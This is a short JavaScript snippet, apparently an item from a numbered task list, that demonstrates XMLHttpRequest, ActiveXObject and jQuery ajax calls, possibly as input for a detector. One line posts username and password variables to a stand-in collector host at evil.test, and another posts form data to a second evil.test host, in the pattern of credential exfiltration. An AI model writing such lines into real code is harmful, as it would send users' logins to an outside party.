// Task 10: XMLHttpRequest (and jQuery's ajax helpers).
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://collector.evil.test/login.php", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("u=" + user + "&p=" + pass);
var legacy = new ActiveXObject("Microsoft.XMLHTTP");
$.ajax({ url: "https://api.evil.test/a", type: "post", data: form });
jQuery.post("/save", data);
$.getJSON("/config.json");
